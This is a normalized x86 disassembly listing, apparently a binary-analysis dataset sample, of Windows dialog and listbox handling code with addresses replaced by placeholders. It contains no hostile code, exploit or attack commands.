push 0xbbf
push esi
call edi
dec ebx
jne r-xdata
test ebx ebx
jl r-xdata
mov ebp eax
mov edi edi
mov edx [ esp + 0x128 ]
push 0x0
push 0x0
push 0x188
push edx
call [ SendMessageA@IAT ]
mov esi eax
test esi esi
jle r-xdata
mov eax [ ecx + rw-data ]
sub eax edx
sar eax 0x2
xor eax eax
jmp r-xdata
push 0x0
push 0x0
push 0x188
push 0xbbd
push esi
call ebx
push 0x0
push 0x0
push 0x18b
push 0xbbf
push esi
mov edi eax
call ebx
cmp edi 0xffffffff
mov ebp eax
je r-xdata
push 0x0
push 0x0
push 0x188
push 0xbbf
push esi
call ebp
push 0x0
push 0x0
push 0x18b
push 0xbbf
push esi
mov ebx eax
call ebp
cmp [ esp + 0x124 ] 0x3ed
lea ecx [ ebx - 0x1 ]
je r-xdata
xor esi esi
jmp r-xdata
dec eax
jne r-xdata
push 0xbbf
push esi
call [ GetDlgItem@IAT ]
push eax
push 0x10bbf
push 0x111
push esi
call [ SendMessageA@IAT ]
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x108
retn 0x10
mov [ rw-data ] ebx
xor ebp ebp
shl ebx 0x4
jmp r-xdata
push 0x0
push 0x0
push 0x182
push 0xbbf
push esi
call edi
dec ebp
jne r-xdata
xor eax eax
cmp esi 0xffffffff
je r-xdata
mov esi [ ecx + rw-data ]
test esi esi
je r-xdata
mov edx [ ecx + rw-data ]
lea eax [ edx + ebp * 4 ]
mov edx [ eax + 0x4 ]
mov [ eax ] edx
inc ebp
jmp r-xdata
dec eax
cmp ebp eax
jge r-xdata
cmp edi 0x9a
jle r-xdata
cmp ebx 0xffffffff
mov [ esp + 0x14 ] ecx
je r-xdata
lea ecx [ ebx + 0x1 ]
lea ecx [ esi + rw-data ]
push ecx
lea ecx [ esi + rw-data ]
call sub_46a710
add esi 0x10
cmp esi 0x80
jl r-xdata
mov eax [ esp + 0x11c ]
push 0x2
push eax
call [ EndDialog@IAT ]
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x108
retn 0x10
mov ecx [ ebx + rw-data ]
test ecx ecx
jne r-xdata
xor eax eax
push eax
push 0x3ee
push edi
call ebx
push eax
call ebp
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x108
retn 0x10
cmp esi 0xffffffff
je r-xdata
mov eax 0x1
jmp r-xdata
mov eax [ esp + 0x10 ]
cmp eax 0x1
mov ebp [ GetDlgItem@IAT ]
jne r-xdata
mov edx [ ecx + rw-data ]
mov eax edx
sub eax esi
sar eax 0x2
test eax eax
je r-xdata
mov edx [ ecx + rw-data ]
test edx edx
jne r-xdata
mov eax [ edi * 4 + rw-data ]
push eax
push 0x0
push 0x180
push 0xbbf
push esi
call ebx
lea ecx [ esp + 0x10 ]
push ecx
mov ecx [ esp + 0x18 ]
shl ecx 0x4
inc edi
add ecx rw-data
mov [ esp + 0x14 ] edi
call sub_41d190
test ebp ebp
jne r-xdata
add edi 0x8
test ecx ecx
jl r-xdata
mov edx [ esp + 0x11c ]
push 0x1
push edx
call [ EndDialog@IAT ]
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x108
retn 0x10
mov eax [ ebx + rw-data ]
sub eax ecx
sar eax 0x2
xor eax eax
jmp r-xdata
mov eax 0x1
push eax
push 0x3ee
push edi
call ebx
push eax
call ebp
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x108
retn 0x10
mov edi [ esp + 0x11c ]
mov ebx [ GetDlgItem@IAT ]
push eax
push 0x3ed
push edi
call ebx
mov ebp [ EnableWindow@IAT ]
push eax
call ebp
push 0x0
push 0x0
push 0x18b
push 0xbbf
push edi
call [ SendDlgItemMessageA@IAT ]
dec eax
cmp esi eax
jge r-xdata
lea ecx [ eax - 0x1 ]
cmp ebx ecx
jne r-xdata
push 0x0
push 0x4ee
push edi
call ebp
mov esi [ EnableWindow@IAT ]
push eax
call esi
push 0x0
push 0x4ef
push edi
call ebp
push eax
call esi
jmp r-xdata
add edx 0xfffffffc
mov [ ecx + rw-data ] edx
push 0x0
push ebp
push 0x186
push 0xbbf
push esi
call ebx
push 0x1
push 0x4ee
push esi
call [ GetDlgItem@IAT ]
mov edi [ EnableWindow@IAT ]
push eax
call edi
push 0x1
push 0x4ef
push esi
call [ GetDlgItem@IAT ]
push eax
call edi
cmp ecx eax
jge r-xdata
mov eax [ ebx + rw-data ]
test eax eax
je r-xdata
mov eax [ ebx + rw-data ]
mov ecx [ eax + ebp * 4 ]
mov edx [ ecx * 4 + rw-data ]
push edx
push 0x0
push 0x180
push 0xbbf
push esi
call edi
inc ebp
jmp r-xdata
cmp ebp eax
jge r-xdata
push 0x0
push ebx
push 0x186
push 0xbbf
push edi
call [ SendDlgItemMessageA@IAT ]
lea ebx [ eax - 0x2 ]
push 0xbbf
push edi
call ebp
push eax
push 0x10bbf
push 0x111
push edi
call [ SendMessageA@IAT ]
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x108
retn 0x10
push 0x0
push ebx
push 0x182
push 0xbbf
push esi
call ebp
shl edi 0x4
shl ebx 0x2
cmp [ esp + 0x124 ] 0x3ed
lea edi [ edi + rw-data ]
jne r-xdata
mov ebx [ ebx + rw-data ]
sub ebx eax
sar ebx 0x2
test ebx ebx
jle r-xdata
mov ecx [ edi ]
mov edx [ ebx + ecx ]
mov eax [ edx * 4 + rw-data ]
mov ecx [ esp + 0x14 ]
push eax
push ecx
mov eax [ edi ]
mov ecx [ ebx + eax ]
mov edx [ ecx * 4 + rw-data ]
mov eax [ esp + 0x14 ]
push edx
push eax
jmp r-xdata
mov ebx [ GetDlgItem@IAT ]
push 0x1
push 0x4ee
push esi
call ebx
mov ebp [ EnableWindow@IAT ]
push eax
call ebp
push 0x1
push 0x4ef
push esi
call ebx
push eax
call ebp
push 0x0
push 0x0
push 0x186
push 0xbbf
push esi
call edi
jmp r-xdata
push 0x181
push 0xbbf
push esi
call ebp
mov eax [ edi ]
mov edx [ ebx + eax ]
mov ecx [ esp + 0x14 ]
push 0x0
push ecx
mov [ esp + 0x18 ] edx
mov edx [ eax + ecx * 4 ]
push 0x186
mov [ ebx + eax ] edx
mov eax [ edi ]
mov edx [ esp + 0x1c ]
push 0xbbf
push esi
mov [ eax + ecx * 4 ] edx
call ebp
jmp r-xdata
sub_46fbb0
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_4c0df8
push eax
mov [ fs : 0x0 ] esp
sub esp 0x14
push ebx
push ebp
push esi
push edi
mov ecx rw-data
call sub_404310
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov ecx [ rw-data ]
sub ecx eax
sar ecx 0x2
mov [ esp + 0x14 ] ecx
mov [ esp + 0x14 ] eax
jmp r-xdata
push ecx
mov eax esp
mov [ esp + 0x38 ] esp
push esi
mov ecx rw-data
mov [ eax ] 0x0
call sub_46a940
push 0x0
push esi
mov ecx rw-data
call sub_41d110
cmp edi esi
mov eax edi
jge r-xdata
mov ebx esi
mov [ esp + 0x10 ] ebx
lea ebx [ ebx ]
mov esi [ esp + 0x34 ]
mov edi [ esp + 0x14 ]
cmp esi edi
jge r-xdata
mov ecx rw-data
mov [ rw-data ] esi
call sub_401420
mov ecx [ esp + 0x24 ]
pop edi
pop esi
pop ebp
mov [ fs : 0x0 ] ecx
pop ebx
add esp 0x20
retn
nop
mov ecx [ esp + 0x14 ]
inc ebx
cmp ebx ecx
mov [ esp + 0x10 ] ebx
jl r-xdata
mov edx [ ecx + 0xd48 ]
mov edi 0x1
cmp edx edi
jle r-xdata
mov edx [ rw-data ]
mov [ edx + eax * 4 ] 0xffffffff
inc eax
cmp eax esi
jl r-xdata
mov ecx [ eax + ebx * 4 ]
test ecx ecx
je r-xdata
cmp [ rw-data ] esi
jl r-xdata
xor edx edx
test esi esi
jle r-xdata
push ecx
mov eax esp
mov [ esp + 0x38 ] esp
push esi
mov ecx rw-data
mov [ eax ] 0x0
call sub_46a940
push 0x0
push esi
mov ecx rw-data
call sub_41d110
jmp r-xdata
mov [ rw-data ] 0x0
mov ecx [ eax + edx * 4 ]
test ecx ecx
je r-xdata
lea edi [ edx * 4 ]
mov esi [ edi + eax ]
test esi esi
je r-xdata
cmp [ ecx + 0xd48 ] edi
je r-xdata
mov [ esp + 0x20 ] esi
mov ecx [ rw-data ]
mov ebx [ eax + ebx * 4 ]
test ebx ebx
mov edx [ edi + ecx ]
mov [ esp + 0x2c ] 0x0
mov [ esp + 0x1c ] edx
lea ebp [ edi + eax ]
je r-xdata
inc [ esi + 0xd48 ]
mov eax [ rw-data ]
inc edx
cmp edx esi
jl r-xdata
mov ecx [ ebp ]
test ecx ecx
mov [ esp + 0x18 ] ecx
je r-xdata
inc [ ebx + 0xd48 ]
jmp r-xdata
test esi esi
mov [ ebp ] ebx
mov eax [ rw-data ]
mov ebx [ esp + 0x10 ]
mov ecx [ eax + ebx * 4 ]
mov [ edi + eax ] ecx
mov edx [ rw-data ]
lea edi [ edx + ebx * 4 ]
je r-xdata
dec [ ecx + 0xd48 ]
jne r-xdata
mov ebp [ edi ]
test ebp ebp
je r-xdata
inc [ esi + 0xd48 ]
call sub_43fe30
mov eax [ esp + 0x18 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
test esi esi
mov ecx [ esp + 0x1c ]
mov [ edi ] esi
mov eax [ rw-data ]
mov [ eax + ebx * 4 ] ecx
mov [ esp + 0x2c ] 0xffffffff
je r-xdata
dec [ ebp + 0xd48 ]
jne r-xdata
mov eax [ rw-data ]
mov esi [ esp + 0x34 ]
mov ebx [ esp + 0x10 ]
dec [ esi + 0xd48 ]
jne r-xdata
mov ecx ebp
call sub_43fe30
push ebp
call j_sub_4b66ed#2
add esp 0x4
mov ecx esi
call sub_43fe30
push esi
call j_sub_4b66ed#2
add esp 0x4
sub_46fdf0
push esi
mov ecx rw-data
call sub_404310
mov edx [ rw-data ]
xor esi esi
mov eax [ rw-data ]
sub eax edx
sar eax 0x2
xor eax eax
jmp r-xdata
mov [ rw-data ] 0xffffffff
mov ecx rw-data
pop esi
jmp sub_401420
mov ecx [ edx + esi * 4 ]
test ecx ecx
je r-xdata
cmp esi eax
jge r-xdata
inc esi
jmp r-xdata
call sub_439e80
mov edx [ rw-data ]
test edx edx
jne r-xdata
sub_46fe50
push 0xffffffff
mov eax [ fs : 0x0 ]
push sub_4c0d91
push eax
mov eax 0x100d0
mov [ fs : 0x0 ] esp
call sub_4b6180
mov ecx [ rw-data ]
push ebx
push ebp
push esi
xor ebx ebx
cmp ecx ebx
push edi
mov edi [ SendMessageA@IAT ]
je r-xdata
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
mov eax [ ecx + 0xac ]
cmp eax ebx
je r-xdata
mov ecx rw-data
mov [ rw-data ] ebx
call sub_404310
cmp [ rw-data ] ebx
je r-xdata
push 0x10001
push 0x1
push 0x406
push eax
call edi
mov eax [ rw-data ]
push r--data
push ebx
push 0xc
push 0x65
push eax
call [ GetParent@IAT ]
push eax
call [ SendDlgItemMessageA@IAT ]
mov ecx [ rw-data ]
push ebx
push ecx
call [ EnableWindow@IAT ]
cmp ecx ebx
mov esi ecx
je r-xdata
push ebx
push 0x2
push 0x111
push eax
call edi
mov ecx [ rw-data ]
call sub_4ab590
mov eax [ rw-data ]
xor ebx ebx
cmp eax ebx
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov [ rw-data ] ebx
call sub_401a00
push esi
call j_sub_4b66ed#2
add esp 0x4
xor ebp ebp
lea ecx [ ecx ]
push 0xffffffeb
push eax
call [ GetWindowLongA@IAT ]
mov esi eax
cmp esi ebx
je r-xdata
mov ecx [ rw-data ]
sub ecx eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
mov [ esp + 0x10 ] edx
je r-xdata
mov eax [ rw-data ]
sub eax ecx
sar eax 0x2
xor eax eax
jmp r-xdata
mov edi [ esi + 0x20 ]
cmp edi ebx
je r-xdata
mov eax 0xf
xor ebp ebp
mov [ esp + 0x48 ] eax
mov [ esp + 0x44 ] ebp
mov [ esp + 0x34 ] 0x0
mov [ esp + 0x100e8 ] ebp
mov [ esp + 0x2c ] eax
mov [ esp + 0x28 ] ebp
mov [ esp + 0x18 ] 0x0
cmp [ rw-data ] ebp
mov [ esp + 0x100e8 ] 0x1
mov edi 0x10
je r-xdata
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
mov esi [ ecx + ebp * 4 ]
cmp esi ebx
lea edi [ ecx + ebp * 4 ]
je r-xdata
cmp ebp eax
jge r-xdata
mov [ esi + 0x20 ] ebx
mov edi [ esi + 0x24 ]
cmp edi ebx
je r-xdata
dec [ edi + 0xd48 ]
jne r-xdata
cmp [ rw-data ] edi
mov esi [ rw-data ]
jae r-xdata
cmp [ rw-data ] edi
jb r-xdata
mov eax [ rw-data ]
cmp eax ebx
mov [ rw-data ] ebx
je r-xdata
mov edx [ eax + 0xd48 ]
mov esi eax
add eax 0xd48
dec edx
mov ecx edx
cmp ecx ebx
mov [ eax ] edx
jne r-xdata
mov [ edi ] ebx
mov eax [ rw-data ]
mov [ eax + ebp * 4 ] 0xffffffff
inc ebp
jmp r-xdata
dec [ esi + 0xd48 ]
jne r-xdata
mov [ esi + 0x24 ] ebx
dec [ edi + 0xd48 ]
jne r-xdata
mov ecx edi
call sub_43fe30
push edi
call j_sub_4b66ed#2
add esp 0x4
push esi
call sub_457f40
add esp 0x4
cmp eax ebp
jne r-xdata
mov esi rw-data
mov esi rw-data
jmp r-xdata
mov esi [ rw-data ]
jmp r-xdata
cmp [ rw-data ] 0x1b
mov [ rw-data ] ebx
mov [ rw-data ] ebx
mov [ rw-data ] ebx
je r-xdata
mov edx [ eax + 0xd48 ]
mov esi eax
add eax 0xd48
dec edx
mov ecx edx
cmp ecx ebx
mov [ eax ] edx
jne r-xdata
mov ecx esi
call sub_43fe30
push esi
call j_sub_4b66ed#2
add esp 0x4
mov ecx [ rw-data ]
cmp ecx ebx
jne r-xdata
mov ecx esi
call sub_43fe30
push esi
call j_sub_4b66ed#2
add esp 0x4
mov ecx edi
call sub_43fe30
push edi
call j_sub_4b66ed#2
add esp 0x4
lea edx [ eax + esi ]
mov eax edx
lea esi [ eax + 0x1 ]
xor ecx ecx
mov cl [ esi ]
push ecx
lea ecx [ esp + 0x18 ]
call sub_461700
jmp r-xdata
mov edi [ LocalFree@IAT ]
mov ecx [ rw-data ]
xor esi esi
mov [ rw-data ] 0x1
mov ecx esi
call sub_43fe30
push esi
call j_sub_4b66ed#2
add esp 0x4
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax esi
push eax
push edx
lea ecx [ esp + 0x1c ]
call sub_401e80
cmp [ esp + 0x2c ] edi
mov eax [ esp + 0x18 ]
jae r-xdata
mov eax r--data
lea edx [ eax + 0x1 ]
lea ecx [ ecx ]
mov eax [ rw-data ]
sub eax ecx
sar eax 0x2
xor eax eax
jmp r-xdata
push eax
call sub_458010
mov ecx [ esp + 0x2c ]
add esp 0x4
cmp eax ecx
ja r-xdata
lea eax [ esp + 0x18 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x1c ]
call sub_401cc0
push 0xffffffff
push ebp
push rw-data
lea ecx [ esp + 0x3c ]
call sub_401dd0
cmp [ esp + 0x48 ] edi
mov eax [ esp + 0x34 ]
jae r-xdata
cmp ecx ebx
je r-xdata
mov eax [ ecx + esi * 4 ]
cmp eax ebx
je r-xdata
cmp esi eax
jge r-xdata
sub eax ecx
push ebp
push eax
lea ecx [ esp + 0x1c ]
call sub_4017f0
push 0xffffffff
push eax
lea ecx [ esp + 0x1c ]
call sub_401ba0
jmp r-xdata
push eax
call sub_457f00
add esp 0x4
test eax eax
je r-xdata
lea eax [ esp + 0x34 ]
mov ecx rw-data
mov [ rw-data ] ebx
mov [ rw-data ] ebx
mov [ rw-data ] ebx
call sub_460310
mov esi [ rw-data ]
or ebp 0xffffffff
cmp esi ebx
mov [ rw-data ] ebx
mov [ rw-data ] ebp
je r-xdata
push ecx
call j_sub_4b66ed#2
add esp 0x4
inc esi
jmp r-xdata
push eax
call edi
mov ecx [ rw-data ]
push 0xffffffff
push ebp
lea edx [ esp + 0x1c ]
push edx
lea ecx [ esp + 0x3c ]
call sub_4018c0
lea ecx [ esp + 0xd4 ]
call sub_434e80
push r--data
lea ecx [ esp + 0xd8 ]
mov [ esp + 0x100ec ] 0x2
call sub_435490
mov eax [ rw-data ]
xor esi esi
cmp eax ebp
jne r-xdata
mov eax r--data
lea edx [ eax + 0x1 ]
lea esp [ esp ]
mov esi [ rw-data ]
cmp esi ebx
je r-xdata
mov edi [ rw-data ]
cmp edi ebx
mov [ esp + 0x4c ] 0x1
jl r-xdata
cmp ecx ebx
jne r-xdata
mov ecx [ rw-data ]
sub ecx eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
jmp r-xdata
xor edx edx
jmp r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x38 ]
call sub_401cc0
mov edx [ rw-data ]
cmp edx 0x10
mov edi [ rw-data ]
mov [ rw-data ] ebx
mov [ rw-data ] ebx
mov [ rw-data ] ebx
mov [ rw-data ] ebp
mov [ rw-data ] ebx
mov [ rw-data ] ebx
mov eax edi
jae r-xdata
mov edi [ rw-data ]
cmp esi edi
je r-xdata
mov ecx [ rw-data ]
cmp ecx ebx
je r-xdata
cmp [ rw-data ] ebx
jne r-xdata
mov eax 0x66666667
imul edx
sar edx 0x2
mov ecx edx
shr ecx 0x1f
add edx ecx
inc esi
cmp edx ebp
jne r-xdata
mov ecx [ rw-data ]
add ecx eax
cmp edx 0x10
mov esi edi
jae r-xdata
mov eax rw-data
mov eax [ rw-data ]
push eax
call j_sub_4b66ed#2
add esp 0x4
mov ecx esi
call sub_401a90
add esi 0x70
cmp esi edi
jne r-xdata
cmp [ esi + 0x380 ] 0x2
je r-xdata
mov edx [ rw-data ]
mov eax [ esi + 0x380 ]
and edx 0x7
cmp edx eax
jne r-xdata
mov edx [ rw-data ]
mov ecx [ rw-data ]
sub ecx edx
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x6
mov ecx edx
shr ecx 0x1f
add edx ecx
xor edx edx
jmp r-xdata
mov ebx [ wsprintfA@IAT ]
push esi
lea edx [ esp + 0x78 ]
push r--data
push edx
call ebx
push esi
lea eax [ esp + 0x5c ]
push r--data
push eax
call ebx
mov edi [ rw-data ]
add esp 0x18
mov [ esp + 0x10 ] ebp
xor esi esi
mov ebp 0x1
lea ebx [ ebx ]
mov edx edi
jmp r-xdata
mov esi rw-data
mov edx esi
mov [ rw-data ] ebx
cmp [ rw-data ] ebx
je r-xdata
mov eax [ rw-data ]
mov [ esp + 0x50 ] eax
mov edx [ esi + 0x380 ]
shl edx 0x7
mov eax [ edx + rw-data ]
cmp eax ebx
mov [ esp + 0x54 ] eax
jl r-xdata
mov eax [ rw-data ]
mov edx edi
imul edx edx 0x70
cmp [ edx + eax + 0x30 ] ebx
je r-xdata
cmp edi edx
jge r-xdata
mov ecx [ rw-data ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x6
mov ecx edx
shr ecx 0x1f
add edx ecx
xor edx edx
jmp r-xdata
cmp esi ebx
jne r-xdata
mov eax esi
sub eax edx
xor eax eax
jmp r-xdata
push esi
call sub_425bf0
add esp 0x4
cmp [ esi + 0x50 ] 0x10
jb r-xdata
inc edi
push edi
lea ecx [ esi + 0x38 ]
call sub_421150
mov esi [ rw-data ]
mov eax [ esp + 0x10 ]
test eax eax
jle r-xdata
mov eax [ esi + edi + 0x68 ]
test eax eax
je r-xdata
lea eax [ ebp - 0x1 ]
cmp eax edx
jge r-xdata
sub ecx esi
xor ecx ecx
jmp r-xdata
cmp ecx ebx
jne r-xdata
add esi 0x3c
mov [ esp + 0x60 ] esi
mov eax [ esi + 0x3c ]
mov [ esp + 0x60 ] eax
jmp r-xdata
lea ecx [ esp + 0xd4 ]
mov [ esp + 0x100e8 ] 0x1
call sub_434eb0
mov eax [ esp + 0x2c ]
mov esi 0x10
cmp eax esi
jb r-xdata
cmp [ esp + 0x48 ] 0x10
mov eax [ esp + 0x34 ]
jae r-xdata
inc ebp
add esi 0x70
jmp r-xdata
cmp [ esi + edi + 0x18 ] 0x10
jb r-xdata
cmp [ rw-data ] ebx
jne r-xdata
mov esi [ rw-data ]
cmp esi 0x10
mov edi [ rw-data ]
mov eax edi
jae r-xdata
push ecx
push eax
mov ecx rw-data
call sub_401ba0
mov ecx [ rw-data ]
cmp ecx ebx
je r-xdata
lea edx [ esp + 0x4c ]
push edx
push ebx
push 0x1006
push ecx
call [ SendMessageA@IAT ]
mov esi [ rw-data ]
cmp [ esp + 0x48 ] esi
mov [ esp + 0x2c ] 0xf
mov [ esp + 0x28 ] 0x0
mov [ esp + 0x18 ] 0x0
mov [ esp + 0x100e8 ] 0xffffffff
jb r-xdata
mov ecx [ esp + 0x18 ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
push eax
lea ecx [ esp + 0xd8 ]
call sub_4356e0
lea eax [ esp + 0x34 ]
test edi edi
jne r-xdata
lea edi [ esi + edi + 0x4 ]
mov edi [ esi + edi + 0x4 ]
jmp r-xdata
push ebx
call j_sub_41d200
push ebx
call sub_404f00
add esp 0x8
call sub_40bb20
mov ecx rw-data
mov [ rw-data ] ebp
call sub_401420
mov ecx [ esp + 0x100e0 ]
pop edi
pop esi
pop ebp
mov [ fs : 0x0 ] ecx
pop ebx
add esp 0x100dc
retn
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
add ecx eax
cmp esi 0x10
mov edx edi
jae r-xdata
mov eax rw-data
mov edx [ esp + 0x34 ]
push edx
call j_sub_4b66ed#2
add esp 0x4
lea eax [ esi + eax + 0x58 ]
mov eax [ esi + eax + 0x58 ]
jmp r-xdata
push ebp
lea ecx [ esp + 0x78 ]
push ecx
lea edx [ esp + 0x9c ]
push edx
call ebx
push edi
call sub_457f40
add esp 0x10
add eax edi
push eax
lea eax [ esp + 0x98 ]
push eax
lea ecx [ esp + 0xdc ]
call sub_435580
push ebp
lea ecx [ esp + 0x50 ]
push ecx
lea edx [ esp + 0x9c ]
push edx
call ebx
mov eax [ rw-data ]
mov ecx [ esi + eax + 0x6c ]
add esp 0xc
cmp ecx 0x10
jb r-xdata
cmp eax 0xc
jge r-xdata
mov esi edi
jmp r-xdata
mov edx rw-data
mov esi edx
push eax
lea eax [ esp + 0x98 ]
push eax
lea ecx [ esp + 0xdc ]
call sub_435580
mov eax [ esp + 0x10 ]
mov edi [ rw-data ]
inc eax
mov [ esp + 0x10 ] eax
mov al [ rw-data ]
test al al
jne r-xdata
cmp edx ebx
jne r-xdata
mov eax edx
sub eax esi
xor eax eax
jmp r-xdata
mov [ rw-data ] ebx
mov ecx rw-data
call sub_43d760
sub ecx edx
xor ecx ecx
jmp r-xdata
cmp ecx ebx
jne r-xdata
push ecx
push eax
mov ecx rw-data
call sub_401ba0
sub_4706c0
push 0xffffffff
push sub_4c0de5
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x4e8
push ebx
push ebp
push esi
mov ecx rw-data
push edi
mov [ rw-data ] 0x1
mov [ esp + 0xcc ] ecx
call sub_404310
mov ebx [ esp + 0x508 ]
mov eax [ rw-data ]
xor edi edi
cmp ebx eax
mov [ esp + 0x500 ] edi
jl r-xdata
cmp ebx edi
jge r-xdata
lea ebx [ eax - 0x1 ]
mov [ esp + 0x508 ] ebx
mov esi [ rw-data ]
cmp esi edi
je r-xdata
xor ebx ebx
mov [ esp + 0x508 ] ebx
mov edx [ rw-data ]
mov ecx [ rw-data ]
mov ebp [ rw-data ]
xor esi esi
lea esp [ esp ]
mov ecx [ rw-data ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
mov [ esp + 0x30 ] edx
jne r-xdata
mov eax edx
sub eax ecx
sar eax 0x2
xor eax eax
jmp r-xdata
mov eax ebx
imul eax eax 0x70
mov [ esp + 0x18 ] eax
add eax esi
push eax
lea ecx [ esp + 0x60 ]
call sub_402400
cmp [ esp + 0x74 ] 0x10
mov eax [ esp + 0x60 ]
mov [ esp + 0x500 ] 0x1
jae r-xdata
mov ecx rw-data
call sub_401420
or eax 0xffffffff
jmp r-xdata
cmp [ ebp + esi * 4 ] ebx
je r-xdata
cmp esi eax
jge r-xdata
push eax
call sub_439280
mov [ esp + 0x18 ] eax
mov eax [ rw-data ]
shl eax 0x10
add esp 0x4
mov [ esp + 0x20 ] eax
mov [ esp + 0x26 ] 0x0
call [ GetCurrentThreadId@IAT ]
mov ebp [ GetWindowTextA@IAT ]
mov ebx [ SetThreadPriority@IAT ]
mov esi [ rw-data ]
mov [ esp + 0x34 ] eax
mov [ esp + 0x10 ] edi
lea eax [ esp + 0x60 ]
mov ecx [ esp + 0x4f8 ]
pop edi
pop esi
pop ebp
mov [ fs : 0x0 ] ecx
pop ebx
add esp 0x4f4
retn
mov ecx rw-data
call sub_401420
mov eax esi
jmp r-xdata
inc esi
jmp r-xdata
mov ecx [ rw-data ]
sub ecx esi
mov eax 0x66666667
imul ecx
sar edx 0x3
mov ecx edx
shr ecx 0x1f
add edx ecx
xor edx edx
jmp r-xdata
cmp ecx edi
jne r-xdata
mov ebx [ rw-data ]
mov [ esp + 0x10 ] 0x0
mov ecx [ esp + 0x10 ]
mov edx [ edi + esi + 0x4 ]
cmp edx [ esp + 0x34 ]
je r-xdata
cmp [ esp + 0x10 ] edx
jge r-xdata
mov eax [ rw-data ]
sub eax edx
sar eax 0x2
xor eax eax
jmp r-xdata
mov [ esp + 0x26 ] 0x1
jmp r-xdata
mov al [ esp + 0x514 ]
test al al
jne r-xdata
push 0xd50
call sub_4b573e
add esp 0x4
mov [ esp + 0x30 ] eax
test eax eax
mov [ esp + 0x500 ] 0x4
je r-xdata
mov edx [ rw-data ]
mov eax [ edx + ecx * 4 ]
cmp eax 0xffffffff
je r-xdata
cmp ecx eax
jge r-xdata
mov ecx rw-data
mov [ esp + 0x38 ] rw-data
call sub_401490
mov esi eax
test esi esi
mov [ esp + 0x3c ] esi
jle r-xdata
mov eax [ edi + esi + 0xc ]
cmp eax [ esp + 0x508 ]
jne r-xdata
mov [ esp + 0x1c ] 0x0
mov eax [ esp + 0x1c ]
jmp r-xdata
mov ecx eax
call sub_43fd90
test eax eax
mov [ esp + 0x1c ] eax
je r-xdata
mov ecx [ esp + 0x10 ]
inc ecx
mov [ esp + 0x10 ] ecx
jmp r-xdata
mov edi [ esp + 0x18 ]
imul eax eax 0x70
mov ecx [ edi + ebx + 0x18 ]
mov ebp [ edi + ebx + 0x14 ]
add eax ebx
cmp ecx 0x10
jb r-xdata
mov edi [ Sleep@IAT ]
mov [ esp + 0x500 ] 0x2
mov edi edi
mov edi esi
inc [ esp + 0x10 ]
add edi 0x14
jmp r-xdata
mov al [ esp + 0x510 ]
test al al
je r-xdata
mov [ esp + 0x38 ] eax
mov al [ esp + 0x26 ]
test al al
mov [ esp + 0x500 ] 0x5
jne r-xdata
inc [ eax + 0xd48 ]
mov edx [ rw-data ]
test edx edx
jne r-xdata
lea edi [ edi + ebx + 0x4 ]
mov edi [ edi + ebx + 0x4 ]
jmp r-xdata
mov ecx rw-data
call sub_401420
test esi esi
mov [ esp + 0x500 ] 0x1
jle r-xdata
mov ecx [ rw-data ]
sub ecx eax
mov eax 0x66666667
imul ecx
sar edx 0x3
mov ecx edx
shr ecx 0x1f
add edx ecx
mov [ esp + 0x30 ] edx
je r-xdata
mov ecx rw-data
call sub_401420
dec edi
jne r-xdata
test esi esi
mov [ esp + 0x1c ] edi
jne r-xdata
mov edx [ edi + esi ]
lea eax [ edi + esi ]
push 0x1
mov esi eax
mov ecx 0x5
lea edi [ esp + 0x4c ]
push edx
[ edi ] [ esi ]
call ebx
mov ecx rw-data
mov [ esp + 0x38 ] rw-data
call sub_401490
test eax eax
mov [ esp + 0x3c ] eax
jle r-xdata
mov ecx [ rw-data ]
mov eax [ rw-data ]
cmp eax ecx
push 0x208
lea ecx [ esp + 0xd4 ]
push ecx
jne r-xdata
call [ timeGetTime@IAT ]
mov edi [ rw-data ]
mov ebx [ esp + 0x18 ]
mov ecx [ ebx + edi + 0x30 ]
test ecx ecx
mov [ esp + 0x30 ] eax
lea eax [ ebx + edi ]
je r-xdata
mov esi [ rw-data ]
mov ebx [ esp + 0x34 ]
xor ebp ebp
xor edi edi
cmp edx ebp
jb r-xdata
cmp edx ebp
mov ecx edx
jb r-xdata
mov edx [ eax + 0x14 ]
test edx edx
je r-xdata
jmp r-xdata
mov ecx rw-data
call sub_401420
jmp r-xdata
mov [ esp + 0x500 ] 0x3
mov esi eax
nop
push eax
call ebp
push r--data
lea edx [ esp + 0xd4 ]
push edx
call [ lstrcatA@IAT ]
mov ecx [ rw-data ]
lea eax [ esp + 0xd0 ]
push eax
push ecx
mov edx [ rw-data ]
push edx
call ebp
push r--data
lea eax [ esp + 0xd4 ]
push eax
call [ lstrcatA@IAT ]
mov edx [ rw-data ]
lea ecx [ esp + 0xd0 ]
push ecx
push edx
jmp r-xdata
mov [ ebx + edi + 0x30 ] 0x0
mov [ esp + 0x14 ] 0xffffffff
jmp r-xdata
cmp [ eax + 0x38 ] 0xffffffff
jne r-xdata
mov ecx [ rw-data ]
sub ecx esi
mov eax 0x66666667
imul ecx
sar edx 0x3
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
